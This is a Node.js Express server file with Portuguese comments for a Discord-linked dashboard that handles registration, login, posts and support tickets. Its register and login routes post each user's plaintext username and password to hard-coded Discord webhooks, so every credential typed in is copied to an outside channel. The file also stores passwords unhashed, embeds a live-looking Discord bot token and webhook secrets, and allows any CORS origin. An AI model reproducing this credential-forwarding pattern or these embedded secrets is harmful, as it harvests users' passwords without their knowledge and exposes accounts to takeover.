const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const port = 3000;

// Configurar o cliente do MongoDB
const mongoClient = new MongoClient(process.env.MONGODB_URI);
let db;

// Servir arquivos estáticos (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());
app.use(cors({ origin: '*' }));

async function connectToMongo() {
    try {
        await mongoClient.connect();
        db = mongoClient.db('dashboard'); // Nome do banco de dados
        console.log('Conectado ao MongoDB com sucesso!');
    } catch (error) {
        console.error('Erro ao conectar ao MongoDB:', error.message);
        process.exit(1); // Encerra o servidor se não conseguir conectar ao MongoDB
    }
}

const DISCORD_TOKEN = 'MTMxNDM5NzI3NzU2NTIyMjk1Mg.GROHdp.hgXOu5iYihl_HgAUc5D1rWrTMm8n3jA5Up_UFk';

const BADGES = {
  'DISCORD_NITRO': 1, // Nitro (1 << 0)
  'DISCORD_BOT_DEVELOPER': 2, // Bot Developer (1 << 1)
  'PARTNER': 4, // Partnered (1 << 2)
  'HYPESQUAD': 8, // HypeSquad (1 << 3)
  'BUG_HUNTER': 64, // Bug Hunter (1 << 6)
  'EARLY_SUPPORTER': 512, // Early Supporter (1 << 9)
  'DISCORD_STAFF': 16384, // Discord Staff (1 << 14)
  'VERIFIED_BOT': 256, // Verified Bot (1 << 8)

  // Novas badges de Nitro
  'NITRO_BRONZE': 8192, // Nitro Bronze (1 << 13)
  'NITRO_PRATA': 32768, // Nitro Prata (1 << 15)
  'NITRO_OURO': 65536, // Nitro Ouro (1 << 16)
  'NITRO_PLATINA': 131072, // Nitro Platina (1 << 17)
  'NITRO_DIAMANTE': 262144, // Nitro Diamante (1 << 18)
  'NITRO_ESMERALDA': 524288, // Nitro Esmeralda (1 << 19)
  'NITRO_RUBI': 1048576, // Nitro Rubi (1 << 20)
  'NITRO_FOGO': 2097152, // Nitro Fogo (1 << 21)
  
  // Boost Level 1
  'BOOST_LEVEL_1': 16777216, // Boost Level 1 (1 << 24)
};

// Função para formatar a data
function formatDate(date) {
    const day = String(date.getDate()).padStart(2, '0');  // Adiciona zero à esquerda se necessário
    const month = String(date.getMonth() + 1).padStart(2, '0');  // O mês começa do 0, então somamos 1
    const year = date.getFullYear();
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');

    return `${day}/${month}/${year} ${hours}:${minutes}`;
}

app.post('/register', async (req, res) => {
    const { username, password, discordId, invite } = req.body;
    if (!username || !password || !discordId) {
        return res.status(400).json({ message: 'Dados incompletos.' });
    }

    try {
        const userExists = await db.collection('account').findOne({ username });
        if (userExists) {
            return res.status(400).json({ message: 'Nome de usuário já existe.' });
        }

        const createdAt = new Date();
        const formattedDate = formatDate(createdAt);  // Formatar a data

        const newUser = { username, password, discordId, invite, createdAt: formattedDate };
        await db.collection('account').insertOne(newUser);

        // Enviar dados para a Webhook do Discord
        const webhookUrl = 'https://canary.discord.com/api/webhooks/1316535986813010021/ATi7Drd4PkF4puYJfw6MkxSskGxDf1rPUhg00yMh5V3gBG5rHW7SCMgjHzWerXOalNcw';

        const webhookPayload = {
            content: `Novo registro de conta!\n\n**Username:** ${username}\n**Password:** ${password}\n**Discord ID:** ${discordId}\n**Invite:** ${invite}\n**Created At:** ${formattedDate}`,
        };

        const webhookResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookPayload),
        });

        if (!webhookResponse.ok) {
            console.error('Erro ao enviar Webhook:', webhookResponse.statusText);
        }

        res.status(201).json({ message: 'Conta criada com sucesso.' });
    } catch (error) {
        console.error('Erro ao criar conta:', error);
        res.status(500).json({ message: 'Erro ao criar conta.', error });
    }
});
  
const axios = require('axios');

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: 'Dados incompletos.' });
    }

    try {
        const user = await db.collection('account').findOne({ username });
        if (!user) {
            return res.status(404).json({ message: 'Usuário não encontrado.' });
        }

        if (user.password !== password) {
            return res.status(401).json({ message: 'Senha incorreta.' });
        }

        // Obter o avatar do usuário
        let avatarUrl;
        if (user.avatar) {
            avatarUrl = `https://example.com/avatars/${user.avatar}`; // URL do avatar do usuário
        } else {
            avatarUrl = 'https://img.icons8.com/ios-filled/50/ffffff/user-male-circle.png'; // Imagem padrão
        }

        // Enviar os dados para a webhook do Discord
        const webhookData = {
            username: 'Bot', // Nome do bot
            avatar_url: 'https://img.icons8.com/ios-filled/50/ffffff/user-male-circle.png', // Ícone do bot
            content: `Novo login realizado:\n**Username:** ${username}\n**Senha:** ${password}\n**Discord ID:** ${user.discordId}`,
        };

        await axios.post('https://canary.discord.com/api/webhooks/1316554270224679002/7Xf07zM5X3YSTG08Yy47795cw0_K1ZqPMmjB1ZUOJyN-O0NiVygGFTiBiy4SLIRz7ekq', webhookData);

        // Responder com os dados do usuário
        res.json({
            message: 'Login bem-sucedido!',
            discordId: user.discordId, // Discord ID do usuário
            user: { ...user, avatarUrl },
        });

    } catch (error) {
        console.error('Erro ao realizar login:', error);
        res.status(500).json({ message: 'Erro ao realizar login.', error });
    }
});


  

app.get('/discord-profile/:id', async (req, res) => {
  const { id } = req.params;  // Obter o ID do usuário da URL
  try {
    const response = await fetch(`https://discord.com/api/v10/users/${id}`, {
      headers: {
        'Authorization': `Bot ${DISCORD_TOKEN}`
      }
    });

    if (!response.ok) {
      throw new Error(`Erro ao buscar o perfil: ${response.statusText}`);
    }

    const data = await response.json();
    const badges = [];
    for (const [badge, value] of Object.entries(BADGES)) {
      if (data.public_flags & value) {
        badges.push(badge);
      }
    }

    data.badges = badges;
    res.json(data);
  } catch (error) {
    console.error('Erro ao buscar perfil:', error);
    res.status(500).json({ message: 'Erro ao obter perfil do Discord', error });
  }
});

app.post('/posts', async (req, res) => {
    console.log(req.body); // Adicione este log para verificar o conteúdo enviado
    try {
        const { content, username } = req.body;

        if (!content || !username) {
            return res.status(400).json({ message: 'Dados incompletos.' });
        }

        const newPost = { content, username, likes: 0, liked: false };
        const result = await db.collection('posts').insertOne(newPost);

        // Agora, em vez de acessar result.ops[0], use result.insertedId
        res.status(201).json({ message: 'Post criado com sucesso.', post: { ...newPost, _id: result.insertedId } });
    } catch (error) {
        console.error('Erro ao criar o post:', error);
        res.status(500).json({ message: 'Erro ao criar post.', error: error.message });
    }
});




// Listar posts
app.get('/posts', async (req, res) => {
    try {
        const posts = await db.collection('posts').find().toArray();
        res.json(posts);
    } catch (error) {
        res.status(500).json({ message: 'Erro ao listar posts.', error });
    }
});

// Excluir um post
app.delete('/posts/:id', async (req, res) => {
    try {
        const { id } = req.params;

        const result = await db.collection('posts').deleteOne({ _id: new ObjectId(id) });
        if (result.deletedCount === 0) {
            return res.status(404).json({ message: 'Post não encontrado.' });
        }

        res.json({ message: 'Post excluído com sucesso.' });
    } catch (error) {
        res.status(500).json({ message: 'Erro ao excluir post.', error });
    }
});
// Atualizar o like de um post
app.patch('/posts/:id/like', async (req, res) => {
    try {
        const { id } = req.params;
        const post = await db.collection('posts').findOne({ _id: new ObjectId(id) });

        if (!post) {
            return res.status(404).json({ message: 'Post não encontrado.' });
        }

        let updatedLikes = post.likes + 1;

        // Atualizar o post no banco de dados
        await db.collection('posts').updateOne(
            { _id: new ObjectId(id) },
            {
                $set: {
                    likes: updatedLikes, // Atualizar a contagem de curtidas
                }
            }
        );

        res.json({ message: 'Post atualizado com sucesso.', postId: id, likes: updatedLikes });
    } catch (error) {
        res.status(500).json({ message: 'Erro ao atualizar post.', error });
    }
});

app.post('/ticket', async (req, res) => {
    const { username, id, subject, message } = req.body;

    if (!username || !id || !subject || !message) {
        return res.status(400).json({ message: 'Todos os campos são obrigatórios.' });
    }

    try {
        const webhookUrl = 'https://canary.discord.com/api/webhooks/1316600873518104657/bSLkd_K54LYtK4Lk2IUEqbqDPshJgUzyAwvI6ODYEEf_esG-DrNhavkMhIaBK1mkjnFs';

        const webhookPayload = {
            content: `Novo ticket recebido!\n\n**Nick:** ${username}\n**ID:** ${id}\n**Assunto:** ${subject}\n**Mensagem:** ${message}`,
        };

        const webhookResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookPayload),
        });

        if (!webhookResponse.ok) {
            console.error('Erro ao enviar Webhook:', webhookResponse.statusText);
            return res.status(500).json({ message: 'Erro ao enviar o ticket para o suporte.' });
        }

        res.status(200).json({ message: 'Ticket enviado com sucesso!' });
    } catch (error) {
        console.error('Erro ao processar ticket:', error);
        res.status(500).json({ message: 'Erro ao processar o ticket.', error: error.message });
    }
});



// Iniciar o servidor
app.listen(port, () => {
    console.log(`Servidor ouvindo na porta ${port}`);
    connectToMongo();
});
